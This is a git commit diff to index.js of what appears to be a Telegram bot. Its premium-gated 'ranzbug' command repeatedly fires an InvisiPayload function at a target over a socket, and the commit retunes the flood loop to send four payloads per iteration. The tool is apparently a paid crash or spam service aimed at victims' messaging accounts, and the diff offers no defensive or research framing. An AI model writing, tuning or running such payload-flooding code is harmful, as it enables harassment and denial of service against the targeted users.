ab00abf1759b04ceea94437e773681dd8fd94838
kingranzz <156513688+kingranzz@users.noreply.github.com>
2025-03-01 23:04:47 +0800

    Add files via upload

--- index.js
+++ index.js
@@ -1683,7 +1683,10 @@ bot.command("ranzbug", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 160; i++) {
+        for (let i = 0; i < 50; i++) {
+          await InvisiPayload(sock, target);
+          await InvisiPayload(sock, target);
+          await InvisiPayload(sock, target);
           await InvisiPayload(sock, target);
         }
         successCount++;
